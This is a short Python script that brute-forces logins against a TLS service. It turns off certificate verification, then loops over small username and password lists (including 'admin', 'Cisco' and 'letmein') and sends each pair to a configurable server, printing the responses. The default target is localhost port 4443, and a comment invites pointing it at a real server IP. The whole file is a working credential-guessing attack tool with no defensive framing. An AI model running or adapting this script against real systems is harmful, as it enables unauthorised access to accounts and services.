
import socket
import ssl

# Target server configuration
server_ip = "127.0.0.1"  # Change to the actual server IP if testing remotely
port = 4443

# Sample username and password list (can be replaced with larger wordlists)
usernames = ["admin", "Ryan", "test"]
passwords = ["1234", "password", "Cisco", "admin123", "letmein"]

# Set up SSL context
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

for username in usernames:
    for password in passwords:
        try:
            with socket.create_connection((server_ip, port)) as sock:
                with context.wrap_socket(sock, server_hostname=server_ip) as secure_sock:
                    print(f"Trying {username}:{password}")
                    secure_sock.recv(1024)  # Receive LOGIN prompt
                    secure_sock.sendall(username.encode())
                    secure_sock.sendall(password.encode())
                    response = secure_sock.recv(1024).decode()
                    print("Server response:", response)
        except Exception as e:
            print("Connection failed:", e)
